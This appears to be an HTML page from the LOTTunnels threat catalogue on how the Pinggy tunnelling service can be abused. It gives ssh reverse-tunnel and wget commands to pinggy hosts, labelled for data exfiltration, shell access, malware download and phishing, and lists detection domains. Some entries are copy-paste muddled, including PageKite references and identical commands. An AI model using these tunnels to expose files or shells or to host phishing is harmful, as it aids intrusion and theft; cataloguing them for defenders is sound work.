@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Pinggy | LOTTunnels</title>
+    <link rel="icon" href="/assets/favicon.png">
+    <link rel="stylesheet" href="/assets/style.css" type="text/css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
+    <script async defer src="https://buttons.github.io/buttons.js"></script><meta name="title" content="Pinggy on LOTTunnels">
+    <meta name="description" content="Pinggy is a living-off-the-tunnels file containing unexpected functionality that can be abused by attackers; this page lists all its use cases.">
+    <meta property="og:title" name="og:title" content="Pinggy on LOTTunnels">
+    <meta property="og:site_name" name="og:site_name" content="LOTTunnels">
+    <meta property="og:type" name="og:type" content="object">
+    <meta property="og:url" name="og:url" content="http://localhost:4000/lottunnels/Binaries/pinggy/">
+    <meta property="og:image" name="og:image" content="http://localhost:4000/assets/favicon.png">
+    <meta property="og:description" name="og:description" content="Pinggy is a living-of-the-tunnels file containing unexpected functionality that can be abused by attackers; this page lists all its use cases.">
+</head>
+<body>
+    <a href="https://github.com/LOTTunnels/LOTTunnels.github.io" class="github-corner" aria-label="View source on Github"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+    	<h1><a href="/">..</a> /Pinggy<div class="github-buttons">
+        <a class="github-button" href="https://github.com/LOTTunnels/LOTTunnels.github.io" data-icon="octicon-star" data-show-count="true" aria-label="Star LOTTunnels/LOTTunnels.github.io on GitHub">Star</a>
+    </div>
+</h1>
+
+	<div class="function-list"><div><a href="/lottunnels/Binaries/pinggy/#install">Install</a></div><div><a href="/lottunnels/Binaries/pinggy/#exfiltrate">Exfiltration</a></div><div><a href="/lottunnels/Binaries/pinggy/#shell-access">Shell Access</a></div><div><a href="/lottunnels/Binaries/pinggy/#access">Access</a></div><div><a href="/lottunnels/Binaries/pinggy/#download">Download</a></div><div><a href="/lottunnels/Binaries/pinggy/#phishing">Phishing</a></div></div>
+
+	<p>Pinggy is a fast, versatile, and privacy-focused tunneling solution that enables users to expose local services, files, and ports over the internet. It can be leveraged for legitimate purposes like development, testing, and IoT access, but it may also be misused by threat actors to expose sensitive systems, services, or files for malicious purposes. This can be used with SSh or directly via the provided binary.</p>
+
+
+	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-133649096-1"></script>
+	<script>
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+
+	gtag('config', 'UA-133649096-1');
+	</script>
+
+	<script src="/assets/url_helper.js"></script>
+	<section>
+		<h3>Paths:</h3>
+		<ul style="list-style-type:none">
+			<li data-file-path>Downloaded version of pinggy, or directly via SSH.</li>
+		</ul>
+	</section>
+	<section>
+		<h3>Resources:</h3>
+		<ul>
+			<li><a href="https://pinggy.io/docs/">https://pinggy.io/docs/</a></li>
+		</ul>
+	</section>
+	
+	<section>
+		<h3>Acknowledgements:</h3>
+		<ul>
+			<li>Kamran Saifullah (<a href="https://twitter.com/@deFr0ggy">@deFr0ggy</a>)</li>
+		</ul>
+	</section>
+	
+	<section>
+		<h3>Detections:</h3>
+		<ul>
+			<li>Domain: <a href="*.pinggy.io" target="_blank" data-shorten="true">*.pinggy.io</a></li>
+			<li>Domain: <a href="*.pinggy.link" target="_blank" data-shorten="true">*.pinggy.link</a></li>
+			<li>Domain: <a href="*.*.amazonaws.com/public.pinggy.binaries/*" target="_blank" data-shorten="true">*.*.amazonaws.com/public.pinggy.binaries/*</a></li>
+		</ul>
+	</section>
+
+	<section>
+		<h2 id="install" class="function-name">Install</h2>
+		<ol>
+			<li>
+				<p>PageKite provides binarues for multiple operating systems that are not required to be installed on the system as these are standalone binaries.</p>
+				<pre><code>wget https://s3.ap-south-1.amazonaws.com/public.pinggy.binaries/v0.1.3/mac/univ/pinggy</code></pre>
+				<div class="properties">
+					<dl class="row"><dt class="property">Use case</dt><dd>Downloading and execution of pagekite python program.</dd></dl>
+					<dl class="row"><dt class="property">Privileges required</dt><dd>User</dd></dl>
+					<dl class="row"><dt class="property">Operating systems</dt><dd>Windows, Mac, Linux</dd></dl>
+				</div>
+			</li>
+		</ol>
+		<h2 id="exfiltrate" class="function-name">Exfiltration</h2>
+		<ol>
+			<li>
+				<p>Having a local web server running on the local machine, it is possible to expose the entire file system via pinggy tunnels.</p>
+				<pre><code>ssh -p &lt;PORT&gt; -R0:localhost:8000 -L4300:localhost:4300 a.pinggy.io</code></pre>
+				<div class="properties">
+					<dl class="row"><dt class="property">Use case</dt><dd>Exposing local file system over the internet for data exfiltrations.</dd></dl>
+					<dl class="row"><dt class="property">Privileges required</dt><dd>User</dd></dl>
+					<dl class="row"><dt class="property">Operating systems</dt><dd>Windows, Mac, Linux</dd></dl>
+				</div>
+			</li>
+		</ol>
+		<h2 id="shell-access" class="function-name">Shell Access</h2>
+		<ol>
+			<li>
+				<p>Exposing local shell services running on the local machine over the internet for shell access.</p>
+				<pre><code>ssh -p &lt;SSH/RDP/ PORT&gt; -R0:localhost:8000 -L4300:localhost:4300 a.pinggy.io</code></pre>
+				<div class="properties">
+					<dl class="row"><dt class="property">Use case</dt><dd>Hosting local services and binding them to pinggy tunnels for shell-access</dd></dl>
+					<dl class="row"><dt class="property">Privileges required</dt><dd>User</dd></dl>
+					<dl class="row"><dt class="property">Operating systems</dt><dd>Windows, Mac, Linux</dd></dl>
+				</div>
+			</li>
+		</ol>
+		<h2 id="access" class="function-name">Access</h2>
+		<ol>
+			<li>
+				<p>Exposing local serivces/applications running locally and binding them to pinggy domains to be accessed over the internet.</p>
+				<pre><code>ssh -p &lt;PORT&gt; -R0:localhost:8000 -L4300:localhost:4300 a.pinggy.io</code></pre>
+				<div class="properties">
+					<dl class="row"><dt class="property">Use case</dt><dd>Hosting local services/applications running locally and exposing them over the internet.</dd></dl>
+					<dl class="row"><dt class="property">Privileges required</dt><dd>User</dd></dl>
+					<dl class="row"><dt class="property">Operating systems</dt><dd>Windows, Mac, Linux</dd></dl>
+				</div>
+			</li>
+		</ol>
+		<h2 id="download" class="function-name">Download</h2>
+		<ol>
+			<li>
+				<p>Having local files in the directory and exposing them via hosting local web server and binding it to pinggy tunnels will enable threat actors to download malicious binaies onto the compromised host.</p>
+				<pre><code>ssh -p &lt;PORT&gt; -R0:localhost:8000 -L4300:localhost:4300 a.pinggy.io</code></pre>
+				<div class="properties">
+					<dl class="row"><dt class="property">Use case</dt><dd>Hosting malicious binaries locally and downloading these over to the compromised host.</dd></dl>
+					<dl class="row"><dt class="property">Privileges required</dt><dd>User</dd></dl>
+					<dl class="row"><dt class="property">Operating systems</dt><dd>Windows, Mac, Linux</dd></dl>
+				</div>
+			</li>
+		</ol>
+		<h2 id="phishing" class="function-name">Phishing</h2>
+		<ol>
+			<li>
+				<p>Hosting phishing website locally and exposing it over pinggy tunnels to compromise users.</p>
+				<pre><code>ssh -p &lt;PORT&gt;&gt; -R0:localhost:8000 -L4300:localhost:4300 a.pinggy.io</code></pre>
+				<div class="properties">
+					<dl class="row"><dt class="property">Use case</dt><dd>Threat actors can host phishing sites running on the local server and can expose these over the pinggy tunnels for targeting users.</dd></dl>
+					<dl class="row"><dt class="property">Privileges required</dt><dd>User</dd></dl>
+					<dl class="row"><dt class="property">Operating systems</dt><dd>Windows, Mac, Linux</dd></dl>
+				</div>
+			</li>
+		</ol>
+	</section>
+
+    <script>
+        // add permalink on headings
+        document.querySelectorAll('h2').forEach((heading) => {
+            const link = document.createElement('a');
+            link.className = 'permalink';
+            link.href = `#${heading.id}`;
+            heading.appendChild(link);
+        });
+    </script>
+</body>
+</html>
